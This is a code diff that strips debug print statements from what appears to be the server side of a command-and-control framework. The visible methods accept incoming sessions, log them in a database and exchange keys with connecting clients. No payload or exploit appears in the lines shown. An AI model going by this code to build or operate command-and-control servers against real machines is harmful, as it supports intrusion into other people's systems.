@@ -994,23 +994,16 @@ class C2():
 
     @util.threaded
     def serve_until_stopped(self):
-        print('at start of serve until stopped')
         util.display('at start of serve until stopped')
         self.database = database.Database(self._database)
-        print('after database call')
         for session_info in self.database.get_sessions(verbose=True):
             self.database.update_status(session_info.get('uid'), 0)
             session_info['online'] = False
-        print('after for loop')
         while True:
-            print('connecting')
             connection, address = self.socket.accept()
-            print('after accept. creating session')
             session = Session(connection=connection, id=self._count)
-            print('b4 if')
             if session.info != None:
                 info = self.database.handle_session(session.info)
-                print('after handle')
                 if isinstance(info, dict):
                     self._count += 1
                     # if info.pop('new', False):
@@ -1019,7 +1012,6 @@ class C2():
                     # else:
                     #     util.display("\n\n[+]", color='green', style='bright', end=' ')
                     #     util.display("Connection:", color='white', style='bright', end=' ')
-                    print('before displays')
                     # util.display(address[0], color='white', style='normal')
                     # util.display("    Session:", color='white', style='bright', end=' ')
                     # util.display(str(session.id), color='white', style='normal')
@@ -1027,7 +1019,6 @@ class C2():
                     # util.display(time.ctime(session._created), color='white', style='normal')
                     session.info = info
 
-                    print('creating sockets')
                     self.sessions[int(session.id)] = session
 
                     SOCKET_PATH = self.socket_path + str(int(session.id))
@@ -1160,7 +1151,6 @@ class C2():
 
     @util.threaded
     def serve_unix_sockets(self):
-        print("serving sockets")
         while True:
             data = None
             conn = None
@@ -1196,7 +1186,6 @@ class C2():
         Run C2 server administration terminal
 
         """
-        print('triggering run')
         if globals()['debug']:
             util.display('parent={} , child={} , args={}'.format(inspect.stack()[1][3], inspect.stack()[0][3], locals()))
         self._active.set()
@@ -1279,12 +1268,9 @@ class Session(threading.Thread):
         self.key = security.diffiehellman(self.connection)
         # self.rsa = security.Crypto.PublicKey.RSA.generate(2048)
 
-        print('rsa generate')
-
         # from Crypto.PublicKey import RSA
         # self.rsa = RSA.generate(2048)
 
-        print('getting client info')
         try:
             self.info = self.client_info()
             #self.info['id'] = self.id
